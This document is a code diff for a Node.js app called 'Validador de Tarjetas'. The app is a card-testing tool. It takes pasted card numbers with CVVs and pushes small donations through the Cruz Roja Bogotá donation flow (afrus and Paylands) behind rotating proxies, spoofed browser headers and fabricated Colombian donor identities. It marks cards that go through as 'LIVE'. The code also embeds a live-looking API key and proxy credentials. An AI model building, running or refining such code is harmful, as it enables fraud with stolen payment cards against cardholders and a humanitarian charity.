@@ -4,19 +4,18 @@ const path = require('path');
 const faker = require('faker');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const UserAgent = require('user-agents');
+const quickemailverification = require('quickemailverification').client('f6e258af4007570786e44266421a2b7be3004e890917d466df1d130b256b').quickemailverification();
 
 process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
 
 const app = express();
 
-// Configuración de vistas y middlewares
 app.set('view engine', 'hbs');
 app.set('views', path.join(__dirname, 'views'));
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static('public'));
 
-// Lista de proxies Smartproxy (todos con http://)
 const proxyList = [
   'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10001',
   'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10002',
@@ -70,19 +69,16 @@ const proxyList = [
   'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10050'
 ];
 
-// Función para obtener un proxy aleatorio
 function getRandomProxy() {
   const idx = Math.floor(Math.random() * proxyList.length);
   return proxyList[idx];
 }
 
-// Utilidad para loguear en consola y en logs
 function addLog(logs, msg) {
   logs.push(msg);
   console.log(msg);
 }
 
-// Utilidades para cookies y datos aleatorios
 function extractCookies(setCookieHeaders) {
   const cookies = {};
   if (!setCookieHeaders) return cookies;
@@ -94,20 +90,26 @@ function extractCookies(setCookieHeaders) {
   return cookies;
 }
 
+function mergeCookies(oldCookies, newCookies) {
+  return { ...oldCookies, ...newCookies };
+}
+
+function cookiesToHeader(cookies) {
+  return Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
+}
+
 function randomAmount() {
-  const amounts = [5000, 6000, 7000, 8000];
+  const amounts = [1000, 2000, 5000, 8000, 10000];
   return amounts[Math.floor(Math.random() * amounts.length)];
 }
 
 function randomPhone() {
-  // Rango colombiano: 3112500000 - 3222500000
   const start = 3112500000;
   const end = 3222500000;
   return '+57' + Math.floor(Math.random() * (end - start + 1) + start);
 }
 
 function randomCC() {
-  // Rango: 1191000000 - 1193000000
   return String(Math.floor(Math.random() * (1193000000 - 1191000000 + 1) + 1191000000));
 }
 
@@ -121,7 +123,42 @@ function generateFakeUser() {
   return { firstName, lastName, email };
 }
 
-// Página principal
+const nombresLatam = [
+  "Juan","José","Luis","Carlos","Jorge","Pedro","Miguel","Manuel","Francisco","David",
+  "Andrés","Daniel","Alejandro","Mario","Fernando","Ricardo","Eduardo","Roberto","Sergio","Raúl",
+  "Diego","Adrián","Héctor","Pablo","Martín","Cristian","Gabriel","Antonio","Enrique","Oscar",
+  "Ramón","Gustavo","Víctor","Felipe","Emilio","Alfredo","Guillermo","Jesús","Mauricio","Ángel",
+  "Alberto","Rafael","Julio","Rubén","Javier","Armando","Leonardo","Salvador","Ernesto","Arturo",
+  "Santiago","Tomás","Sebastián","Nicolás","Matías","Emmanuel","Esteban","Ignacio","Lucas","Simón",
+  "Samuel","Agustín","Valentín","Bruno","Maximiliano","Facundo","Luciano","Axel","Kevin","Jonathan",
+  "Brian","Damián","Iván","Joel","Franco","Alan","Ezequiel","Nahuel","Lautaro","Federico",
+  "Camilo","Mauricio","Cristóbal","Patricio","Rodrigo","Vicente","Benjamín","Felipe","Emilio","Matías",
+  "Joaquín","Emiliano","Gael","Thiago","Bautista","Juan Pablo","Juan José","Juan Manuel","Juan Carlos","Juan David"
+];
+
+function generateLatamEmail() {
+  const nombre = nombresLatam[Math.floor(Math.random() * nombresLatam.length)].replace(/\s/g, '').toLowerCase();
+  const digitos = (Math.floor(Math.random() * 99) + 1).toString().padStart(2, '0');
+  return `${nombre}${digitos}@gmail.com`;
+}
+
+function generateFakeUserLatam() {
+  const firstName = nombresLatam[Math.floor(Math.random() * nombresLatam.length)];
+  const lastName = nombresLatam[Math.floor(Math.random() * nombresLatam.length)];
+  const email = generateLatamEmail();
+  return { firstName, lastName, email };
+}
+
+// Verifica el correo con quickemailverification
+async function verifyEmail(email) {
+  return new Promise((resolve) => {
+    quickemailverification.verify(email, function (err, response) {
+      if (err) return resolve(false);
+      resolve(response.body.result === 'valid');
+    });
+  });
+}
+
 app.get('/', (req, res) => {
   res.render('index', {
     title: 'Validador de Tarjetas',
@@ -131,7 +168,6 @@ app.get('/', (req, res) => {
   });
 });
 
-// Procesar tarjeta
 app.post('/validate', async (req, res) => {
   const cardData = req.body.card;
   const logs = [];
@@ -149,82 +185,64 @@ app.post('/validate', async (req, res) => {
   const userAgent = new UserAgent().toString();
 
   try {
+    addLog(logs, '🟡 Testeando en página 1 (GET inicial de cookies)...');
+    // 0. Obtener cookies iniciales
+    const initialCookiesResp = await getInitialCookies(logs, proxyAgent, userAgent);
+    cookies = mergeCookies(cookies, initialCookiesResp.cookies);
+
     addLog(logs, '🔵 Iniciando validación...');
     const [number, month, year, cvv] = cardData.split('|');
     addLog(logs, `📦 Datos recibidos: ${number}|${month}|${year}|${cvv}`);
 
-    // Validación básica
     if (!number || !month || !year || !cvv) {
       throw new Error('Formato de tarjeta incorrecto. Use: NUMERO|MES|AÑO|CVV');
     }
 
-    // Endpoint 1: Pixel Tracking
-    addLog(logs, '🟡 Enviando a endpoint 1 (Pixel)...');
-    await sendPixelRequest(logs, proxyAgent, userAgent);
-
-    // Endpoint 3: GET Form Data (y extraer cookies)
-    addLog(logs, '🟡 Enviando a endpoint 3 (GET Form)...');
-    const getFormResp = await getFormDataWithCookies(logs, proxyAgent, userAgent);
-    cookies = getFormResp.cookies;
-    addLog(logs, '🍪 Cookies obtenidas: ' + JSON.stringify(cookies));
-
-    // Generar datos ficticios
+    // Generar datos fake y validar correo hasta 3 veces
     amount = randomAmount();
-
-    // Endpoint 4: leadDonationStart con reintentos si email inválido
-    addLog(logs, '🟡 Enviando a endpoint 4 (leadDonationStart)...');
-    let leadDonationResp;
-    let fakeUser, phone;
-    let leadTries = 0;
-    let leadError = null;
+    let fakeUser, phone, cc, emailTries = 0;
     do {
-      fakeUser = generateFakeUser();
+      fakeUser = generateFakeUserLatam();
       phone = randomPhone();
-      try {
-        leadDonationResp = await leadDonationStart({
-          cookies,
-          fakeUser,
-          amount,
-          phone
-        }, logs, proxyAgent, userAgent);
-        leadError = null;
-      } catch (err) {
-        leadError = err;
-        // Analiza si el error es por email inválido (422 y mensaje email_invalid)
-        if (
-          err.response &&
-          err.response.status === 422 &&
-          (err.response.data.message === 'email_invalid' ||
-            (err.response.data.errors && err.response.data.errors.email))
-        ) {
-          addLog(logs, `🔁 Email inválido, reintentando con otro...`);
-        } else {
-          throw err;
-        }
+      cc = randomCC();
+      addLog(logs, `🔎 Verificando correo: ${fakeUser.email}`);
+      const isValid = await verifyEmail(fakeUser.email);
+      if (isValid) {
+        addLog(logs, `✅ Correo válido: ${fakeUser.email}`);
+        break;
+      } else {
+        addLog(logs, `❌ Correo inválido: ${fakeUser.email}, reintentando...`);
       }
-      leadTries++;
-    } while (leadError && leadTries < 5);
+      emailTries++;
+    } while (emailTries < 5);
 
-    if (leadError) throw leadError;
+    if (emailTries === 5) {
+      throw new Error('No se pudo generar un correo Gmail válido tras 5 intentos');
+    }
 
-    cookies = leadDonationResp.cookies; // Actualizar cookies
-    addLog(logs, '🍪 Cookies actualizadas (endpoint 4): ' + JSON.stringify(cookies));
-    addLog(logs, '🔵 Respuesta endpoint 4: ' + JSON.stringify(leadDonationResp.data));
+    // 1. leadDonationStart
+    addLog(logs, '🟡 Enviando a endpoint 1 (leadDonationStart)...');
+    const leadDonationResp = await leadDonationStart({
+      cookies,
+      fakeUser,
+      amount,
+      phone
+    }, logs, proxyAgent, userAgent);
+    cookies = mergeCookies(cookies, leadDonationResp.cookies);
 
-    // Endpoint 5: donation (token)
-    addLog(logs, '🟡 Enviando a endpoint 5 (donation/token)...');
+    // 2. donation (token)
+    addLog(logs, '🟡 Enviando a endpoint 2 (donation/token)...');
     const donationTokenResp = await donationToken({
       cookies,
       fakeUser,
       amount,
       phone
     }, logs, proxyAgent, userAgent);
-    cookies = donationTokenResp.cookies; // Actualizar cookies
+    cookies = mergeCookies(cookies, donationTokenResp.cookies);
     paymentToken = donationTokenResp.token;
-    addLog(logs, '🔵 Respuesta endpoint 5: ' + JSON.stringify(donationTokenResp.data));
 
-    // Endpoint 6: Guardar tarjeta en Paylands
-    addLog(logs, '🟡 Enviando a endpoint 6 (Paylands Card Save)...');
+    // 3. Paylands Card Save
+    addLog(logs, '🟡 Enviando a endpoint 3 (Paylands Card Save)...');
     const paylandsResp = await paylandsCardSave({
       token: paymentToken,
       number,
@@ -236,18 +254,29 @@ app.post('/validate', async (req, res) => {
     cardBrand = paylandsResp.brand;
     cardBrandDesc = paylandsResp.brand_description;
     cardBank = paylandsResp.bank;
-    addLog(logs, '🔵 Respuesta endpoint 6: ' + JSON.stringify(paylandsResp));
 
-    // Endpoint 7: donation final (con tarjeta)
-    addLog(logs, '🟡 Enviando a endpoint 7 (donation final)...');
+    // 4. addPaymentInfo
+    addLog(logs, '🟡 Enviando a endpoint 4 (addPaymentInfo)...');
+    const addPaymentResp = await addPaymentInfo({
+      cookies,
+      fakeUser,
+      amount,
+      phone,
+      uuid,
+      cc
+    }, logs, proxyAgent, userAgent);
+    cookies = mergeCookies(cookies, addPaymentResp.cookies);
+
+    // 5. donation final
+    addLog(logs, '🟡 Enviando a endpoint 5 (donation final)...');
     const donationFinalResp = await donationFinal({
       cookies,
       fakeUser,
       amount,
       phone,
-      uuid
+      uuid,
+      cc
     }, logs, proxyAgent, userAgent);
-    addLog(logs, '🔵 Respuesta endpoint 7: ' + JSON.stringify(donationFinalResp));
 
     addLog(logs, '✅ Validación completada con éxito');
 
@@ -256,11 +285,11 @@ app.post('/validate', async (req, res) => {
       results: {
         status: 'LIVE',
         card: `${number.substring(0, 4)}**** **** ****`,
-        bank: cardBank || detectBank(number),
-        type: cardBrand || detectCardType(number),
-        brand_description: cardBrandDesc || '',
-        uuid: uuid || '',
-        amount // Mostrar el monto cobrado
+        bank: cardBank,
+        type: cardBrand,
+        brand_description: cardBrandDesc,
+        uuid: uuid,
+        amount
       },
       error: null,
       logs: logs
@@ -281,126 +310,103 @@ app.post('/validate', async (req, res) => {
   }
 });
 
-// Funciones para los endpoints
-
-async function sendPixelRequest(logs, proxyAgent, userAgent) {
+// --- NUEVO ENDPOINT INICIAL DE COOKIES ---
+async function getInitialCookies(logs, proxyAgent, userAgent) {
   try {
-    const response = await axios.post(
-      'https://donar.cruzrojabogota.org.co/wp-admin/admin-ajax.php',
-      new URLSearchParams({
-        action: 'pys_api_event',
-        ajax_event: 'ff98136bee',
-        'data[_fbp]': 'fb.1.1744598574627.1816376187',
-        'data[event_url]': 'donar.cruzrojabogota.org.co/catatumbo/',
-        'data[page_title]': 'Emergencia Catatumbo',
-        'data[plugin]': 'PixelYourSite',
-        'data[post_id]': '7154',
-        'data[post_type]': 'page',
-        'data[user_role]': 'guest',
-        edd_order: '',
-        event: 'PageView',
-        eventID: '7c707070-a0c8-415f-8a32-e8e0ae981724',
-        'ids[]': '936281707247211',
-        pixel: 'facebook',
-        url: 'https://donar.cruzrojabogota.org.co/catatumbo/',
-        woo_order: ''
-      }),
-      {
-        headers: {
-          'X-Requested-With': 'XMLHttpRequest',
-          'Content-Type': 'application/x-www-form-urlencoded',
-          'User-Agent': userAgent
-        },
-        httpsAgent: proxyAgent
-      }
-    );
-    addLog(logs, `🟢 Pixel Status: ${response.status}`);
-  } catch (error) {
-    addLog(logs, `🔴 Pixel Error: ${error.message}`);
-    throw error;
-  }
-}
-
-// OMITIDO: sendOptionsRequest
-
-async function getFormDataWithCookies(logs, proxyAgent, userAgent) {
-  try {
+    const headers = {
+      'sec-ch-ua-platform': '"Windows"',
+      'User-Agent': userAgent,
+      'Accept': 'application/json, text/plain, */*',
+      'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+      'Content-Type': 'application/json',
+      'sec-ch-ua-mobile': '?0',
+      'Sec-Fetch-Site': 'cross-site',
+      'Sec-Fetch-Mode': 'cors',
+      'Sec-Fetch-Dest': 'empty',
+      'host': 'my.afrus.app'
+    };
     const response = await axios.get(
-      'https://my.afrus.org/api/form/2d90b31c-4ac3-4bd8-9656-0de01743902f',
+      'https://my.afrus.app/api/form/a4064c13-acb2-4ccf-bdfb-5da1463320e9',
       {
-        headers: {
-          'Accept': 'application/json',
-          'User-Agent': userAgent
-        },
+        headers,
         httpsAgent: proxyAgent
       }
     );
-    addLog(logs, `🟢 GET Form Status: ${response.status}`);
-    addLog(logs, `📄 Response: ${JSON.stringify(response.data)}`);
-    // Extraer cookies
-    const cookies = extractCookies(response.headers['set-cookie'] || []);
-    return { data: response.data, cookies };
+    addLog(logs, `🟢 GET inicial cookies Status: ${response.status}`);
+    const newCookies = extractCookies(response.headers['set-cookie'] || []);
+    return { cookies: newCookies };
   } catch (error) {
-    addLog(logs, `🔴 GET Form Error: ${error.message}`);
+    addLog(logs, `🔴 GET inicial cookies Error: ${error.message}`);
     throw error;
   }
 }
+
+// --- RESTO DE ENDPOINTS IGUAL QUE ANTES ---
 
 async function leadDonationStart({ cookies, fakeUser, amount, phone }, logs, proxyAgent, userAgent) {
   try {
+    const headers = {
+      'sec-ch-ua-platform': '"Windows"',
+      'User-Agent': userAgent,
+      'Accept': 'application/json, text/plain, */*',
+      'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+      'Content-Type': 'application/json;charset=UTF-8',
+      'sec-ch-ua-mobile': '?0',
+      'Sec-Fetch-Site': 'cross-site',
+      'Sec-Fetch-Mode': 'cors',
+      'Sec-Fetch-Dest': 'empty',
+      'host': 'my.afrus.org',
+      'Cookie': cookiesToHeader(cookies)
+    };
+    const body = {
+      is_donation: true,
+      form_id: 3243,
+      treatment: null,
+      campaign_id: 1312,
+      amount: amount + '.00',
+      currency_id: 36,
+      country_id: 49,
+      gateway_id: 8,
+      language_code: 'ES',
+      organization_id: 18,
+      first_name: fakeUser.firstName,
+      last_name: fakeUser.lastName,
+      email: fakeUser.email,
+      phone: phone,
+      gender: '',
+      born_date: null,
+      state: '',
+      city: '',
+      street: '',
+      street_number: '',
+      zip_code: '',
+      rest_address: '',
+      rest_address2: '',
+      countryPhone: 'CO',
+      type: 1,
+      url_landing: 'https://donar.cruzrojabogota.org.co/',
+      unomi_metadata: {},
+      organization: '',
+      custom_fields: {},
+      metadata: {
+        gateway: { name: 'Bakery' },
+        amount: amount,
+        is_subscription: false,
+        form: { name: 'Invierno Colombia 2022' },
+        campaign: { name: 'Invierno Colombia 2022' }
+      }
+    };
     const response = await axios.post(
       'https://my.afrus.org/api/leadDonationStart',
+      body,
       {
-        is_donation: true,
-        form_id: 9164,
-        treatment: null,
-        campaign_id: 5059,
-        amount: amount + '.00',
-        currency_id: 36,
-        country_id: 49,
-        gateway_id: 8,
-        language_code: 'ES',
-        organization_id: 18,
-        first_name: fakeUser.firstName,
-        last_name: fakeUser.lastName,
-        email: fakeUser.email,
-        phone: phone,
-        gender: '',
-        born_date: null,
-        state: '',
-        city: '',
-        street: '',
-        street_number: '',
-        zip_code: '',
-        rest_address: '',
-        rest_address2: '',
-        countryPhone: 'CO',
-        type: 1,
-        url_landing: 'https://donar.cruzrojabogota.org.co/',
-        unomi_metadata: {},
-        organization: '',
-        custom_fields: { ciudad: 'cucuta' },
-        metadata: {
-          gateway: { name: 'Bakery' },
-          amount: amount,
-          is_subscription: false,
-          form: { name: 'Emergencia Catatumbo' },
-          campaign: { name: 'Crisis Catatumbo' }
-        }
-      },
-      {
-        headers: {
-          'User-Agent': userAgent,
-          'Accept': 'application/json, text/plain, */*',
-          'Content-Type': 'application/json;charset=UTF-8',
-          'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
-        },
+        headers,
         httpsAgent: proxyAgent
       }
     );
     addLog(logs, `🟢 leadDonationStart Status: ${response.status}`);
     const newCookies = extractCookies(response.headers['set-cookie'] || []);
-    return { data: response.data, cookies: { ...cookies, ...newCookies } };
+    return { data: response.data, cookies: newCookies };
   } catch (error) {
     addLog(logs, `🔴 leadDonationStart Error: ${error.message}`);
     throw error;
@@ -409,55 +415,64 @@ async function leadDonationStart({ cookies, fakeUser, amount, phone }, logs, pro
 
 async function donationToken({ cookies, fakeUser, amount, phone }, logs, proxyAgent, userAgent) {
   try {
+    const headers = {
+      'sec-ch-ua-platform': '"Windows"',
+      'User-Agent': userAgent,
+      'Accept': 'application/json, text/plain, */*',
+      'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+      'Content-Type': 'application/json;charset=UTF-8',
+      'sec-ch-ua-mobile': '?0',
+      'Sec-Fetch-Site': 'cross-site',
+      'Sec-Fetch-Mode': 'cors',
+      'Sec-Fetch-Dest': 'empty',
+      'host': 'my.afrus.org',
+      'Cookie': cookiesToHeader(cookies)
+    };
+    const body = {
+      treatment: null,
+      form_id: 3243,
+      country_id: 49,
+      language_code: 'ES',
+      url_landing: 'https://donar.cruzrojabogota.org.co/',
+      amount: amount + '.00',
+      is_subscription: false,
+      gateway_id: 8,
+      campaign_id: 1312,
+      organization_id: 18,
+      first_name: fakeUser.firstName,
+      last_name: fakeUser.lastName,
+      email: fakeUser.email,
+      phone: phone,
+      currency_id: 36,
+      state: '',
+      city: '',
+      gender: '',
+      born_date: null,
+      street: '',
+      street_number: '',
+      zip_code: '',
+      rest_address: '',
+      rest_address2: '',
+      countryPhone: 'CO',
+      type: 1,
+      identification_type: null,
+      id_transaction: null,
+      custom_fields: {},
+      payment_method: 'card',
+      unomi_metadata: {},
+      organization: '',
+      frequency_id: 1,
+      fundraising_campaign_id: null,
+      terms_accepted: true,
+      terms2_accepted: null,
+      private: false,
+      requestToken: true
+    };
     const response = await axios.post(
       'https://my.afrus.org/api/donation',
+      body,
       {
-        treatment: null,
-        form_id: 9164,
-        country_id: 49,
-        language_code: 'ES',
-        url_landing: 'https://donar.cruzrojabogota.org.co/',
-        amount: amount + '.00',
-        is_subscription: false,
-        gateway_id: 8,
-        campaign_id: 5059,
-        organization_id: 18,
-        first_name: fakeUser.firstName,
-        last_name: fakeUser.lastName,
-        email: fakeUser.email,
-        phone: phone,
-        currency_id: 36,
-        state: '',
-        city: '',
-        gender: '',
-        born_date: null,
-        street: '',
-        street_number: '',
-        zip_code: '',
-        rest_address: '',
-        rest_address2: '',
-        countryPhone: 'CO',
-        type: 1,
-        identification_type: null,
-        id_transaction: null,
-        custom_fields: { ciudad: 'cucuta' },
-        payment_method: 'card',
-        unomi_metadata: {},
-        organization: '',
-        frequency_id: 1,
-        fundraising_campaign_id: null,
-        terms_accepted: true,
-        terms2_accepted: true,
-        private: false,
-        requestToken: true
-      },
-      {
-        headers: {
-          'User-Agent': userAgent,
-          'Accept': 'application/json, text/plain, */*',
-          'Content-Type': 'application/json;charset=UTF-8',
-          'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
-        },
+        headers,
         httpsAgent: proxyAgent
       }
     );
@@ -465,7 +480,7 @@ async function donationToken({ cookies, fakeUser, amount, phone }, logs, proxyAg
     const newCookies = extractCookies(response.headers['set-cookie'] || []);
     const token = response.data.token;
     addLog(logs, `🔑 Token obtenido: ${token}`);
-    return { data: response.data, cookies: { ...cookies, ...newCookies }, token };
+    return { data: response.data, cookies: newCookies, token };
   } catch (error) {
     addLog(logs, `🔴 donation/token Error: ${error.message}`);
     throw error;
@@ -474,23 +489,33 @@ async function donationToken({ cookies, fakeUser, amount, phone }, logs, proxyAg
 
 async function paylandsCardSave({ token, number, month, year, cvv }, logs, proxyAgent, userAgent) {
   try {
+    const headers = {
+      'sec-ch-ua-platform': '"Windows"',
+      'X-Requested-With': 'XMLHttpRequest',
+      'User-Agent': userAgent,
+      'Accept': '*/*',
+      'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+      'sec-ch-ua-mobile': '?0',
+      'Sec-Fetch-Site': 'same-origin',
+      'Sec-Fetch-Mode': 'cors',
+      'Sec-Fetch-Dest': 'empty',
+      'Sec-Fetch-Storage-Access': 'active',
+      'host': 'api.paylands.com'
+    };
+    const body = {
+      token: token,
+      card_pan: number,
+      card_expiry_month: month,
+      card_expiry_year: year.substring(2, 4),
+      card_cvv: cvv,
+      url_post: ''
+    };
     const response = await axios.post(
       'https://api.paylands.com/v1/cards/save/frame',
+      body,
       {
-        token: token,
-        card_pan: number,
-        card_expiry_month: month,
-        card_expiry_year: year.substring(2, 4), // Solo los dos últimos dígitos
-        card_cvv: cvv,
-        url_post: ''
-      },
-      {
-        headers: {
-          'X-Requested-With': 'XMLHttpRequest',
-          'User-Agent': userAgent,
-          'Accept': '*/*',
-          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
-        },
+        headers,
         httpsAgent: proxyAgent
       }
     );
@@ -508,58 +533,147 @@ async function paylandsCardSave({ token, number, month, year, cvv }, logs, proxy
   }
 }
 
-async function donationFinal({ cookies, fakeUser, amount, phone, uuid }, logs, proxyAgent, userAgent) {
+async function addPaymentInfo({ cookies, fakeUser, amount, phone, uuid, cc }, logs, proxyAgent, userAgent) {
   try {
+    const headers = {
+      'sec-ch-ua-platform': '"Windows"',
+      'User-Agent': userAgent,
+      'Accept': 'application/json, text/plain, */*',
+      'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+      'Content-Type': 'application/json;charset=UTF-8',
+      'sec-ch-ua-mobile': '?0',
+      'Sec-Fetch-Site': 'cross-site',
+      'Sec-Fetch-Mode': 'cors',
+      'Sec-Fetch-Dest': 'empty',
+      'host': 'my.afrus.org',
+      'Cookie': cookiesToHeader(cookies)
+    };
+    const body = {
+      treatment: null,
+      form_id: 3243,
+      country_id: 49,
+      language_code: 'ES',
+      url_landing: 'https://donar.cruzrojabogota.org.co/',
+      amount: amount + '.00',
+      is_subscription: false,
+      gateway_id: 8,
+      campaign_id: 1312,
+      organization_id: 18,
+      first_name: fakeUser.firstName,
+      last_name: fakeUser.lastName,
+      email: fakeUser.email,
+      phone: phone,
+      currency_id: 36,
+      state: '',
+      city: '',
+      gender: '',
+      born_date: null,
+      street: '',
+      street_number: '',
+      zip_code: '',
+      rest_address: '',
+      rest_address2: '',
+      countryPhone: 'CO',
+      type: 1,
+      identification_type: 4,
+      identification: cc,
+      id_transaction: null,
+      custom_fields: {},
+      payment_method: 'card',
+      unomi_metadata: {},
+      organization: '',
+      frequency_id: 1,
+      fundraising_campaign_id: null,
+      terms_accepted: true,
+      terms2_accepted: null,
+      private: false,
+      payment_token: uuid,
+      metadata: {
+        gateway: { name: 'Bakery' },
+        amount: amount,
+        is_subscription: false,
+        form: { name: 'Invierno Colombia 2022' },
+        campaign: { name: 'Invierno Colombia 2022' }
+      }
+    };
+    const response = await axios.post(
+      'https://my.afrus.org/api/donation/addPaymentInfo',
+      body,
+      {
+        headers,
+        httpsAgent: proxyAgent
+      }
+    );
+    addLog(logs, `🟢 addPaymentInfo Status: ${response.status}`);
+    const newCookies = extractCookies(response.headers['set-cookie'] || []);
+    return { data: response.data, cookies: newCookies };
+  } catch (error) {
+    addLog(logs, `🔴 addPaymentInfo Error: ${error.message}`);
+    throw error;
+  }
+}
+
+async function donationFinal({ cookies, fakeUser, amount, phone, uuid, cc }, logs, proxyAgent, userAgent) {
+  try {
+    const headers = {
+      'sec-ch-ua-platform': '"Windows"',
+      'User-Agent': userAgent,
+      'Accept': 'application/json, text/plain, */*',
+      'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+      'Content-Type': 'application/json;charset=UTF-8',
+      'sec-ch-ua-mobile': '?0',
+      'Sec-Fetch-Site': 'cross-site',
+      'Sec-Fetch-Mode': 'cors',
+      'Sec-Fetch-Dest': 'empty',
+      'host': 'my.afrus.org',
+      'Cookie': cookiesToHeader(cookies)
+    };
+    const body = {
+      treatment: null,
+      form_id: 3243,
+      country_id: 49,
+      language_code: 'ES',
+      url_landing: 'https://donar.cruzrojabogota.org.co/',
+      amount: amount + '.00',
+      is_subscription: false,
+      gateway_id: 8,
+      campaign_id: 1312,
+      organization_id: 18,
+      first_name: fakeUser.firstName,
+      last_name: fakeUser.lastName,
+      email: fakeUser.email,
+      phone: phone,
+      currency_id: 36,
+      state: '',
+      city: '',
+      gender: '',
+      born_date: null,
+      street: '',
+      street_number: '',
+      zip_code: '',
+      rest_address: '',
+      rest_address2: '',
+      countryPhone: 'CO',
+      type: 1,
+      identification_type: 4,
+      identification: cc,
+      id_transaction: null,
+      custom_fields: {},
+      payment_method: 'card',
+      unomi_metadata: {},
+      organization: '',
+      frequency_id: 1,
+      fundraising_campaign_id: null,
+      terms_accepted: true,
+      terms2_accepted: null,
+      private: false,
+      payment_token: uuid
+    };
     const response = await axios.post(
       'https://my.afrus.org/api/donation',
+      body,
       {
-        treatment: null,
-        form_id: 9164,
-        country_id: 49,
-        language_code: 'ES',
-        url_landing: 'https://donar.cruzrojabogota.org.co/',
-        amount: amount + '.00',
-        is_subscription: false,
-        gateway_id: 8,
-        campaign_id: 5059,
-        organization_id: 18,
-        first_name: fakeUser.firstName,
-        last_name: fakeUser.lastName,
-        email: fakeUser.email,
-        phone: phone,
-        currency_id: 36,
-        state: '',
-        city: '',
-        gender: '',
-        born_date: null,
-        street: '',
-        street_number: '',
-        zip_code: '',
-        rest_address: '',
-        rest_address2: '',
-        countryPhone: 'CO',
-        type: 1,
-        identification_type: 4,
-        identification: randomCC(),
-        id_transaction: null,
-        custom_fields: { ciudad: 'cucuta' },
-        payment_method: 'card',
-        unomi_metadata: {},
-        organization: '',
-        frequency_id: 1,
-        fundraising_campaign_id: null,
-        terms_accepted: true,
-        terms2_accepted: true,
-        private: false,
-        payment_token: uuid
-      },
-      {
-        headers: {
-          'User-Agent': userAgent,
-          'Accept': 'application/json, text/plain, */*',
-          'Content-Type': 'application/json;charset=UTF-8',
-          'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
-        },
+        headers,
         httpsAgent: proxyAgent
       }
     );
@@ -578,18 +692,6 @@ async function donationFinal({ cookies, fakeUser, amount, phone, uuid }, logs, p
     }
     throw error;
   }
-}
-
-// Funciones auxiliares
-function detectBank(number) {
-  const firstDigits = number.substring(0, 4);
-  // Lógica para detectar banco según BIN
-  return 'Scotiabank'; // Ejemplo
-}
-
-function detectCardType(number) {
-  // Lógica para detectar tipo de tarjeta
-  return /^5[1-5]/.test(number) ? 'Mastercard' : 'Visa'; // Ejemplo
 }
 
 // Iniciar servidor
